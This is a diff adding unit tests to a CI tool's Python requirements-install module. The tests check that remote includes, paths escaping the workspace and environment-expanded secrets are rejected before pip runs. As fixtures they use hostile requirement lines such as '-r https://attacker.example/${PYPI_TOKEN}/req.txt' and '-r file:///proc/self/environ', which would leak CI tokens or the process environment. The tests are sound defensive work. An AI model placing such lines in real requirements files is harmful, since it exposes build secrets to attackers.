@@ -1,7 +1,7 @@
 """Tests for the Python install module."""
 
 # These tests share symlink setup patterns with other python modules.
-# pylint: disable=duplicate-code
+# pylint: disable=duplicate-code,too-many-public-methods
 
 import os
 import tempfile
@@ -425,8 +425,9 @@ class TestPythonInstallModule(unittest.TestCase):
 
         self.assertEqual(
             str(context.exception),
-            "Requirements file resolves outside the workspace: " f"{secret.resolve()}",
+            "Requirements reference must exist inside the workspace: ../secret.txt",
         )
+        self.assertNotIn("PYPI_TOKEN=secret", str(context.exception))
         self.mock_runner.run.assert_not_called()
 
     def test_run_installs_requirements_include_that_stays_inside_workspace(self):
@@ -497,3 +498,316 @@ class TestPythonInstallModule(unittest.TestCase):
                 module.run(self.mock_runner, {"requirements": "requirements.txt"})
 
         self.mock_runner.run.assert_called_once()
+
+    def test_run_rejects_expanded_requirement_option(self):
+        """Reject expanded -r, -c, --find-links, and -e values before pip runs."""
+        secret = "pypi-live-token-xyz"
+        appveyor = "v2.abc-appveyor-secret"
+        lines = (
+            "--find-links ${PYPI_TOKEN}",
+            "--find-links=${PYPI_TOKEN}",
+            "-f ${PYPI_TOKEN}",
+            "-f${PYPI_TOKEN}",
+            '--find-links "${PYPI_TOKEN}"',
+            "--find-links \\\n${PYPI_TOKEN}",
+            "-r ${APPVEYOR_API_TOKEN}",
+            "--requirement ${APPVEYOR_API_TOKEN}",
+            "--requirement=${APPVEYOR_API_TOKEN}",
+            "-c ${APPVEYOR_API_TOKEN}",
+            "--constraint=${APPVEYOR_API_TOKEN}",
+            "-e ${APPVEYOR_API_TOKEN}",
+            "--editable ${APPVEYOR_API_TOKEN}",
+            "--editable=${APPVEYOR_API_TOKEN}",
+        )
+        env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
+        for line in lines:
+            with self.subTest(line=line):
+                self.mock_runner.reset_mock()
+                with tempfile.TemporaryDirectory() as temp_dir:
+                    base_path = Path(temp_dir)
+                    self.mock_runner.get_base_path.return_value = base_path
+                    (base_path / "requirements.txt").write_text(
+                        f"pylint==4.0.6\nbuild==1.5.0\n{line}\n",
+                        encoding="utf-8",
+                    )
+                    if "PYPI_TOKEN" in line:
+                        placeholder = "${PYPI_TOKEN}"
+                    else:
+                        placeholder = "${APPVEYOR_API_TOKEN}"
+                    module = PythonInstallModule()
+                    with patch.dict(os.environ, env):
+                        with self.assertRaises(DroneException) as context:
+                            module.run(
+                                self.mock_runner,
+                                {"requirements": "requirements.txt"},
+                            )
+
+                message = str(context.exception)
+                self.assertEqual(
+                    message,
+                    "Requirements reference must exist inside the workspace: "
+                    + placeholder,
+                )
+                self.assertNotIn(secret, message)
+                self.assertNotIn(appveyor, message)
+                self.mock_runner.run.assert_not_called()
+
+    def test_run_rejects_requirements_reference_outside_workspace(self):
+        """Reject remote URLs and paths that resolve outside the workspace."""
+        self._assert_remote_references_rejected()
+        leaked = "LEAKED_ENVIRONMENT=do-not-log"
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            base_path = root / "workspace"
+            base_path.mkdir()
+            self.mock_runner.get_base_path.return_value = base_path
+            outside = root / "outside.txt"
+            outside.write_text(f"{leaked}\nbuild==1.5.0\n", encoding="utf-8")
+            (root / "links").mkdir()
+            nested = base_path / "nested.txt"
+            requirements = base_path / "requirements.txt"
+            module = PythonInstallModule()
+            escaped = (
+                "-r ../outside.txt",
+                f"-r {outside.as_uri()}",
+                "--find-links ../links",
+                "-e ../links",
+            )
+            for line in escaped:
+                with self.subTest(line=line):
+                    self._assert_outside_reference_rejected(requirements, line, leaked)
+
+            self.mock_runner.reset_mock()
+            nested.write_text(f"-r {outside.as_uri()}\n", encoding="utf-8")
+            requirements.write_text("-r nested.txt\n", encoding="utf-8")
+            with self.assertRaises(DroneException) as context:
+                module.run(self.mock_runner, {"requirements": "requirements.txt"})
+            self.assertNotIn(leaked, str(context.exception))
+            self.mock_runner.run.assert_not_called()
+
+            self.mock_runner.reset_mock()
+            nested.write_text(
+                "-r https://attacker.example/evil.txt\n",
+                encoding="utf-8",
+            )
+            requirements.write_text("-r nested.txt\n", encoding="utf-8")
+            with patch("urllib.request.urlopen") as urlopen:
+                with self.assertRaises(DroneException):
+                    module.run(self.mock_runner, {"requirements": "requirements.txt"})
+            urlopen.assert_not_called()
+            self.mock_runner.run.assert_not_called()
+
+    def _assert_remote_references_rejected(self):
+        """Reject remote -r, -c, --find-links, and -e URLs before pip fetches them."""
+        secret = "pypi-live-token-xyz"
+        cases = (
+            "-r https://attacker.example/evil.txt",
+            "-c https://attacker.example/constraints.txt",
+            "--requirement=http://attacker.example/evil.txt",
+            "-r https://attacker.example/${PYPI_TOKEN}/req.txt",
+            "-e git+https://github.com/example/pkg.git#egg=pkg",
+            "--find-links https://files.example/simple",
+        )
+        for line in cases:
+            with self.subTest(line=line):
+                self.mock_runner.reset_mock()
+                with tempfile.TemporaryDirectory() as temp_dir:
+                    base_path = Path(temp_dir)
+                    self.mock_runner.get_base_path.return_value = base_path
+                    (base_path / "requirements.txt").write_text(
+                        f"build==1.5.0\n{line}\n",
+                        encoding="utf-8",
+                    )
+                    module = PythonInstallModule()
+                    with patch.dict(os.environ, {"PYPI_TOKEN": secret}):
+                        with patch("urllib.request.urlopen") as urlopen:
+                            with self.assertRaises(DroneException) as context:
+                                module.run(
+                                    self.mock_runner,
+                                    {"requirements": "requirements.txt"},
+                                )
+
+                self.assertNotIn(secret, str(context.exception))
+                urlopen.assert_not_called()
+                self.mock_runner.run.assert_not_called()
+
+    def _assert_outside_reference_rejected(self, requirements, line, leaked):
+        """Fail when *line* escapes the workspace, without logging *leaked*."""
+        self.mock_runner.reset_mock()
+        requirements.write_text(f"build==1.5.0\n{line}\n", encoding="utf-8")
+        module = PythonInstallModule()
+        with patch("urllib.request.urlopen") as urlopen:
+            with self.assertRaises(DroneException) as context:
+                module.run(self.mock_runner, {"requirements": "requirements.txt"})
+        self.assertNotIn(leaked, str(context.exception))
+        urlopen.assert_not_called()
+        self.mock_runner.run.assert_not_called()
+
+    def test_run_rejects_remote_include_before_nested_environ_url(self):
+        """Reject a remote -r/-c before pip opens a nested file:// environment URL.
+
+        Pip downloads an http requirements file and then opens nested file URLs
+        from that body. ``file:///proc/self/environ`` is a symlink, so a direct
+        include is rejected, but the nested URL is only present after the
+        download. Refusing the remote include keeps the process environment out
+        of the build log.
+        """
+        secret = "pypi-live-token-xyz"
+        appveyor = "v2.abc-appveyor-secret"
+        lines = (
+            "-r https://attacker.example/evil.txt",
+            "-c https://attacker.example/evil.txt",
+            "--requirement=http://attacker.example/evil.txt",
+            "-r \\\nhttps://attacker.example/evil.txt",
+            "-r https://attacker.example/${PYPI_TOKEN}/evil.txt",
+            "-r file://attacker.example/proc/self/environ",
+            "-r file://localhost/proc/self/environ",
+        )
+        env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
+        for line in lines:
+            with self.subTest(line=line):
+                self.mock_runner.reset_mock()
+                with tempfile.TemporaryDirectory() as temp_dir:
+                    base_path = Path(temp_dir)
+                    self.mock_runner.get_base_path.return_value = base_path
+                    (base_path / "requirements.txt").write_text(
+                        f"build==1.5.0\n{line}\n",
+                        encoding="utf-8",
+                    )
+                    module = PythonInstallModule()
+                    with patch.dict(os.environ, env):
+                        with patch("urllib.request.urlopen") as urlopen:
+                            urlopen.return_value.read.return_value = (
+                                b"-r file:///proc/self/environ\n"
+                            )
+                            with self.assertRaises(DroneException) as context:
+                                module.run(
+                                    self.mock_runner,
+                                    {"requirements": "requirements.txt"},
+                                )
+
+                message = str(context.exception)
+                self.assertNotIn(secret, message)
+                self.assertNotIn(appveyor, message)
+                self.assertNotIn("file:///proc/self/environ", message)
+                self.assertNotIn("PYPI_TOKEN=", message)
+                urlopen.assert_not_called()
+                self.mock_runner.run.assert_not_called()
+
+    def test_run_rejects_nested_remote_include_in_local_file(self):
+        """Reject a remote include named by a local requirements file."""
+        secret = "pypi-live-token-xyz"
+        appveyor = "v2.abc-appveyor-secret"
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base_path = Path(temp_dir)
+            self.mock_runner.get_base_path.return_value = base_path
+            (base_path / "nested.txt").write_text(
+                "-r https://attacker.example/evil.txt\n",
+                encoding="utf-8",
+            )
+            (base_path / "requirements.txt").write_text(
+                "-r nested.txt\n",
+                encoding="utf-8",
+            )
+            module = PythonInstallModule()
+            env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
+            with patch.dict(os.environ, env):
+                with patch("urllib.request.urlopen") as urlopen:
+                    urlopen.return_value.read.return_value = (
+                        b"-r file:///proc/self/environ\n"
+                    )
+                    with self.assertRaises(DroneException) as context:
+                        module.run(
+                            self.mock_runner, {"requirements": "requirements.txt"}
+                        )
+
+        message = str(context.exception)
+        self.assertNotIn(secret, message)
+        self.assertNotIn(appveyor, message)
+        self.assertNotIn("file:///proc/self/environ", message)
+        urlopen.assert_not_called()
+        self.mock_runner.run.assert_not_called()
+
+    def test_run_rejects_direct_environ_file_url(self):
+        """Reject file:///proc/self/environ before pip reads the environment."""
+        secret = "pypi-live-token-xyz"
+        appveyor = "v2.abc-appveyor-secret"
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base_path = Path(temp_dir)
+            self.mock_runner.get_base_path.return_value = base_path
+            (base_path / "requirements.txt").write_text(
+                "-r file:///proc/self/environ\n",
+                encoding="utf-8",
+            )
+            module = PythonInstallModule()
+            env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
+            with patch.dict(os.environ, env):
+                with self.assertRaises(DroneException) as context:
+                    module.run(self.mock_runner, {"requirements": "requirements.txt"})
+
+        message = str(context.exception)
+        self.assertNotIn(secret, message)
+        self.assertNotIn(appveyor, message)
+        self.assertNotIn("PYPI_TOKEN=", message)
+        self.mock_runner.run.assert_not_called()
+
+    def test_run_rejects_remote_requirements_argument(self):
+        """Reject a requirements argument that is itself a remote or file URL."""
+        secret = "pypi-live-token-xyz"
+        arguments = (
+            "https://attacker.example/evil.txt",
+            "http://attacker.example/${PYPI_TOKEN}/evil.txt",
+            "file:///proc/self/environ",
+        )
+        for requirements in arguments:
+            with self.subTest(requirements=requirements):
+                self.mock_runner.reset_mock()
+                with tempfile.TemporaryDirectory() as temp_dir:
+                    base_path = Path(temp_dir)
+                    self.mock_runner.get_base_path.return_value = base_path
+                    module = PythonInstallModule()
+                    with patch.dict(os.environ, {"PYPI_TOKEN": secret}):
+                        with patch("urllib.request.urlopen") as urlopen:
+                            with self.assertRaises(DroneException) as context:
+                                module.run(
+                                    self.mock_runner,
+                                    {"requirements": requirements},
+                                )
+
+                message = str(context.exception)
+                self.assertNotIn(secret, message)
+                self.assertNotIn("PYPI_TOKEN=", message)
+                urlopen.assert_not_called()
+                self.mock_runner.run.assert_not_called()
+
+    def test_run_installs_local_find_links_and_editable(self):
+        """Install when find-links and editable paths stay inside the workspace."""
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base_path = Path(temp_dir)
+            self.mock_runner.get_base_path.return_value = base_path
+            self.mock_runner.run.return_value = 0
+            wheelhouse = base_path / "wheelhouse"
+            wheelhouse.mkdir()
+            package = base_path / "pkg"
+            package.mkdir()
+            (base_path / "included.txt").write_text("build==1.5.0\n", encoding="utf-8")
+            requirements = (
+                "build==1.5.0\n",
+                "build==1.5.0\n--find-links wheelhouse\n",
+                "-e pkg\n",
+                "-e .[dev]\n",
+                "-r ${REQ_INCLUDE}\n",
+                "--find-links ${LINKS}\nbuild==1.5.0\n",
+            )
+            env = {"REQ_INCLUDE": "included.txt", "LINKS": "wheelhouse"}
+            for body in requirements:
+                with self.subTest(body=body):
+                    self.mock_runner.reset_mock()
+                    self.mock_runner.run.return_value = 0
+                    (base_path / "requirements.txt").write_text(body, encoding="utf-8")
+                    module = PythonInstallModule()
+                    with patch.dict(os.environ, env):
+                        module.run(
+                            self.mock_runner, {"requirements": "requirements.txt"}
+                        )
+                    self.mock_runner.run.assert_called_once()
